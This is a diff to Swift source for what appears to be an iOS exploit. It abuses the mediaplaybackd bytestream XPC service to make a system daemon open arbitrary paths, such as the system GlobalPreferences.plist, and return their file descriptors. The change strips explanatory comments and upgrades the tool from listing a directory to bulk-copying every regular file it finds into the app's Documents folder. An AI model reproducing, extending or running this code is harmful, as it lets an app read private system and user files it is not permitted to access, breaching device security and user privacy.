@@ -27,7 +27,6 @@ private func resetSessionLogFile() {
 private func openLog() {
     if logFd >= 0 { close(logFd); logFd = -1 }
     let path = docs.appendingPathComponent("run.log").path
-    // Keep all runs from the current app session in the same log file.
     logFd = open(path, O_WRONLY | O_CREAT | O_APPEND, 0o644)
 }
 
@@ -36,7 +35,6 @@ private final class EHBox {
     var seen = false
 }
 
-/// Releases the +1 CoreFoundation-style reference returned by a Fig *Create/Complete API.
 private func releaseFigReference(_ pointer: UnsafeMutableRawPointer?) {
     guard let pointer else { return }
     Unmanaged<CFTypeRef>.fromOpaque(pointer).release()
@@ -46,7 +44,6 @@ private func releaseFigReference(_ pointer: UnsafeMutableRawPointer?) {
 
 private let legacyTargetPath = "/private/var/mobile/Library/Preferences/.GlobalPreferences.plist"
 
-/// Builds a safe local output filename without restricting the requested input path.
 private func outputFilename(for targetPath: String) -> String {
     let name = URL(fileURLWithPath: targetPath).lastPathComponent
     let safeName = name.isEmpty || name == "/" ? "target.bin" : name
@@ -342,7 +339,7 @@ private func runChain(targetPath requestedPath: String, onLog: @escaping (String
         return String(cString: n)
     }
 
-    // Step 2 — connect (no entitlement required).
+    // Step 2 — connect.
     guard let conn = "com.apple.coremedia.mediaplaybackd.bytestream.xpc".withCString({ fConnCreate($0, nil, 0) }) else {
         logLine("XPC connection failed"); return
     }
@@ -355,10 +352,6 @@ private func runChain(targetPath requestedPath: String, onLog: @escaping (String
     fSetEH(conn, eh as AnyObject)
     fResume(conn)
     logLine("XPC connected")
-
-    // Each Run owns one XPC session. Leaving it active makes the next Run's
-    // memory-origin handshake collide with the still-live previous session.
-    // Cancel first, then release the xpc_connection_t after all requests finish.
 
     func send(_ m: UnsafeMutableRawPointer?) -> (OpaquePointer?, String) {
         guard let m = m else { return (nil, "nil") }
@@ -380,8 +373,6 @@ private func runChain(targetPath requestedPath: String, onLog: @escaping (String
     }
 
     // Step 3 — memory-origin handshake.
-    // Both Fig APIs below follow Create-rule ownership: keep their +1 refs alive
-    // for the stream lifetime, then release them before cancelling the XPC session.
     var memoryRecipient: UnsafeMutableRawPointer? = nil
     var memoryOrigin: UnsafeMutableRawPointer? = nil
 
@@ -389,7 +380,7 @@ private func runChain(targetPath requestedPath: String, onLog: @escaping (String
     var handshakeReady = false
 
     var rp1Msg: UnsafeMutableRawPointer? = nil
-    if fBasic(0x2e727031, 0, &rp1Msg) == 0, let m1 = rp1Msg {           // '.rp1'
+    if fBasic(0x2e727031, 0, &rp1Msg) == 0, let m1 = rp1Msg {
         let (r1, t1) = send(m1)
         let replyDetail = (t1 == "error") ? " — \(desc(r1))" : ""
         logLine("Handshake 1: \(t1)\(replyDetail)")
@@ -397,7 +388,7 @@ private func runChain(targetPath requestedPath: String, onLog: @escaping (String
 
         if let r1 = r1, t1 == "dictionary" {
             var rp2Msg: UnsafeMutableRawPointer? = nil
-            if fBasic(0x2e727032, 0, &rp2Msg) == 0, let m2 = rp2Msg {   // '.rp2'
+            if fBasic(0x2e727032, 0, &rp2Msg) == 0, let m2 = rp2Msg {
                 let cr = "mconf".withCString { fRecip(r1, m2, $0, &memoryRecipient) }
                 logLine("Recipient creation: status=\(cr), object=\(memoryRecipient == nil ? "nil" : "present")")
 
@@ -422,7 +413,7 @@ private func runChain(targetPath requestedPath: String, onLog: @escaping (String
 
     if rp2Ready {
         var orgMsg: UnsafeMutableRawPointer? = nil
-        if fBasic(0x2e6f7267, 0, &orgMsg) == 0, let om = orgMsg {       // '.org'
+        if fBasic(0x2e6f7267, 0, &orgMsg) == 0, let om = orgMsg {
             let bg = fBegin(om)
             logLine("Origin begin: status=\(bg)")
             if bg == 0 {
@@ -450,7 +441,6 @@ private func runChain(targetPath requestedPath: String, onLog: @escaping (String
         logLine("Origin handshake skipped: .rp1/.rp2 did not complete")
     }
 
-    // Render the entries already present in a directory FD directly in Run Log.
     func directoryEntryName(_ entry: UnsafeMutablePointer<dirent>) -> String {
         let capacity = MemoryLayout.size(ofValue: entry.pointee.d_name)
         return withUnsafePointer(to: &entry.pointee.d_name) { namePointer in
@@ -460,139 +450,63 @@ private func runChain(targetPath requestedPath: String, onLog: @escaping (String
         }
     }
 
-    func describeEntryType(_ mode: mode_t) -> String {
-        switch mode & mode_t(S_IFMT) {
-        case mode_t(S_IFDIR): return "DIR"
-        case mode_t(S_IFREG): return "FILE"
-        case mode_t(S_IFLNK): return "SYMLINK"
-        case mode_t(S_IFCHR): return "CHAR"
-        case mode_t(S_IFBLK): return "BLOCK"
-        case mode_t(S_IFIFO): return "FIFO"
-        case mode_t(S_IFSOCK): return "SOCKET"
-        default: return "OTHER"
-        }
-    }
-
-    func escapedEntryName(_ name: String) -> String {
-        name.replacingOccurrences(of: "\\", with: "\\\\")
-            .replacingOccurrences(of: "\t", with: "\\t")
-            .replacingOccurrences(of: "\n", with: "\\n")
-            .replacingOccurrences(of: "\r", with: "\\r")
-    }
-
-    func saveDirectoryListing(fd: Int32, outputName: String) {
+    /// Перечисляет папку и возвращает ИСКЛЮЧИТЕЛЬНО обычные файлы (пропуская вложенные папки)
+    func getFilesInDirectory(fd: Int32) -> [String] {
         guard let directory = fdopendir(fd) else {
             let savedErrno = errno
             close(fd)
             logLine("Directory stream creation failed: errno=\(savedErrno)")
-            return
+            return []
         }
         defer { closedir(directory) }
 
         let directoryFD = dirfd(directory)
-        var entries: [(name: String, type: String?, size: Int64?)] = []
-        let maximumEntries = 10_000
-        var reachedLimit = false
-        var readError: Int32 = 0
+        var fileNames: [String] = []
 
         while true {
             errno = 0
-            guard let entry = readdir(directory) else {
-                readError = errno
-                break
-            }
+            guard let entry = readdir(directory) else { break }
             let name = directoryEntryName(entry)
             if name == "." || name == ".." { continue }
-            if entries.count >= maximumEntries {
-                reachedLimit = true
-                break
-            }
 
             var itemStat = stat()
             let statResult = name.withCString {
                 fstatat(directoryFD, $0, &itemStat, AT_SYMLINK_NOFOLLOW)
             }
             if statResult == 0 {
-                entries.append((name, describeEntryType(itemStat.st_mode), Int64(itemStat.st_size)))
-            } else {
-                // When metadata is unavailable, show the entry name without UNKNOWN or ? placeholders.
-                entries.append((name, nil, nil))
+                // Оставляем ТОЛЬКО обычные файлы (S_IFREG)
+                if (itemStat.st_mode & mode_t(S_IFMT)) == mode_t(S_IFREG) {
+                    fileNames.append(name)
+                }
             }
         }
 
-        entries.sort { $0.name.localizedStandardCompare($1.name) == .orderedAscending }
-        logLine("Directory entries (\(entries.count)):")
-        var manifestLines = ["Type\tSize\tName"]
-        for entry in entries {
-            let safeName = escapedEntryName(entry.name)
-            let renderedLine: String
-            if let type = entry.type, let size = entry.size {
-                renderedLine = "\(type)\t\(size)\t\(safeName)"
-            } else {
-                renderedLine = safeName
-            }
-            manifestLines.append(renderedLine)
-            logLine(renderedLine)
-        }
-        if reachedLimit {
-            manifestLines.append("TRUNCATED\t-\tEntry limit: \(maximumEntries)")
-            logLine("Directory listing truncated at \(maximumEntries) entries")
-        }
-        if readError != 0 {
-            manifestLines.append("READ_ERROR\t-\terrno=\(readError)")
-            logLine("Directory enumeration ended with errno=\(readError)")
-        }
-
-        let output = docs.appendingPathComponent(outputName)
-        do {
-            try (manifestLines.joined(separator: "\n") + "\n").write(
-                to: output,
-                atomically: true,
-                encoding: .utf8
-            )
-            logLine("Saved directory listing \(entries.count) entries: \(outputName)")
-        } catch {
-            logLine("Directory listing save failed: \(error.localizedDescription)")
-        }
+        fileNames.sort { $0.localizedStandardCompare($1) == .orderedAscending }
+        return fileNames
     }
 
-    // Save an ordinary file byte-for-byte, or show a directory's immediate entries.
-    func takeFd(_ outputName: String, directoryOutputName: String, fd: Int32) {
+    // Сохраняет одиночный файл
+    func saveFile(fd: Int32, outputName: String) {
+        defer { close(fd) }
         var st = stat()
         guard fstat(fd, &st) == 0 else {
-            let savedErrno = errno
-            close(fd)
-            logLine("File descriptor check failed: errno=\(savedErrno)")
+            logLine("fstat failed: errno=\(errno)")
             return
         }
 
-        let fileType = st.st_mode & mode_t(S_IFMT)
-        if fileType == mode_t(S_IFDIR) {
-            logLine("Target is a directory; listing entries")
-            saveDirectoryListing(fd: fd, outputName: directoryOutputName)
-            return
-        }
-
-        guard fileType == mode_t(S_IFREG) else {
-            close(fd)
-            logLine("Target is neither a regular file nor a directory")
-            return
-        }
-
-        defer { close(fd) }
         let size = Int64(st.st_size)
         guard size > 0 else {
-            logLine("Unexpected file size: \(size)")
+            logLine("File \(outputName) is empty (\(size) bytes)")
             return
         }
         guard size <= Int64(Int.max) else {
-            logLine("File is too large to read into memory: \(size) bytes")
+            logLine("File \(outputName) is too large: \(size) bytes")
             return
         }
         var buffer = [UInt8](repeating: 0, count: Int(size))
         let count = pread(fd, &buffer, buffer.count, 0)
         guard count > 0 else {
-            logLine("File read failed: errno=\(errno)")
+            logLine("Read failed for \(outputName): errno=\(errno)")
             return
         }
         let output = docs.appendingPathComponent(outputName)
@@ -600,41 +514,36 @@ private func runChain(targetPath requestedPath: String, onLog: @escaping (String
             try Data(buffer.prefix(count)).write(to: output, options: .atomic)
             logLine("Saved \(count) bytes: \(outputName)")
         } catch {
-            logLine("Save failed: \(error.localizedDescription)")
+            logLine("Save failed for \(outputName): \(error.localizedDescription)")
         }
     }
 
-    // 'Curl' probe: let the daemon open `path` and hand back the fd.
-    func probe(_ path: String, outputName: String, directoryOutputName: String) {
+    // Проба пути через 'Curl' daemon
+    func probe(_ path: String) -> Int32? {
         let cfURL = URL(fileURLWithPath: path) as CFURL
         var msg: UnsafeMutableRawPointer? = nil
-        guard fBasic(0x4375726c, 0, &msg) == 0, let m = msg else {       // 'Curl'
-            logLine("Request message failed"); return
+        guard fBasic(0x4375726c, 0, &msg) == 0, let m = msg else {
+            logLine("Request message failed for: \(path)"); return nil
         }
         _ = fSetURL(m, "CreationURL", Unmanaged.passUnretained(cfURL).toOpaque())
         fSetU64(OpaquePointer(m), "FileOpenOptions", 0)
         let (rp, rt) = send(m)
         fRel(OpaquePointer(m))
         guard rt == "dictionary", let rp = rp else {
-            logLine("Request failed: \(rt)"); if let rp = rp { fRel(rp) }; return
+            logLine("Request failed for \(path): \(rt)")
+            if let rp = rp { fRel(rp) }
+            return nil
         }
         guard let details = fVal(rp, "ByteStreamDetails") else {
             let err = fI64(rp, ".ErrorReturn")
-            logLine("Access denied (\(err))")
-            fRel(rp); return
+            logLine("Access denied for \(path) (\(err))")
+            fRel(rp)
+            return nil
         }
         let oid = fU64(details, "ObjectID")
-        logLine("Stream opened")
         let fd = fDupFd(details, "FileDescriptor")
-        if fd >= 0 {
-            logLine("File descriptor received")
-            takeFd(outputName, directoryOutputName: directoryOutputName, fd: fd)
-        } else {
-            logLine("No file descriptor returned")
-        }
 
-
-        // close the stream server-side
+        // Закрываем стрим на сервере
         var mD: UnsafeMutableRawPointer? = nil
         if fBasic(0x646f6f6d, oid, &mD) == 0, let mD = mD {
             let (rd, _) = send(mD)
@@ -642,17 +551,49 @@ private func runChain(targetPath requestedPath: String, onLog: @escaping (String
             fRel(OpaquePointer(mD))
         }
         fRel(rp)
+
+        return fd >= 0 ? fd : nil
     }
 
     if handshakeReady {
-        let directoryOutputName = outputFilename(for: targetPath) + ".directory.txt"
-        probe(targetPath, outputName: outputName, directoryOutputName: directoryOutputName)
+        logLine("Opening target path: \(targetPath)")
+        if let initialFd = probe(targetPath) {
+            var st = stat()
+            if fstat(initialFd, &st) == 0 {
+                let fileType = st.st_mode & mode_t(S_IFMT)
+                if fileType == mode_t(S_IFDIR) {
+                    logLine("Target is a directory. Enumerating regular files...")
+                    let fileNames = getFilesInDirectory(fd: initialFd)
+                    logLine("Found \(fileNames.count) regular file(s) inside directory.")
+
+                    let basePath = targetPath.hasSuffix("/") ? targetPath : targetPath + "/"
+                    for name in fileNames {
+                        let fullFilePath = basePath + name
+                        logLine("Reading file: \(name)")
+                        if let fileFd = probe(fullFilePath) {
+                            saveFile(fd: fileFd, outputName: name)
+                        } else {
+                            logLine("Failed to open file: \(name)")
+                        }
+                    }
+                } else if fileType == mode_t(S_IFREG) {
+                    logLine("Target is a single file.")
+                    saveFile(fd: initialFd, outputName: outputName)
+                } else {
+                    close(initialFd)
+                    logLine("Target is neither a regular file nor a directory.")
+                }
+            } else {
+                close(initialFd)
+                logLine("Failed to fstat target FD.")
+            }
+        } else {
+            logLine("Failed to obtain initial FD for target path.")
+        }
     } else {
         logLine("Read skipped: memory-origin handshake was not established")
     }
 
-    // Drop Fig-side state before closing the XPC transport. This prevents one
-    // completed Run from leaving an origin/recipient attached to this process.
     releaseFigReference(memoryOrigin)
     memoryOrigin = nil
     releaseFigReference(memoryRecipient)
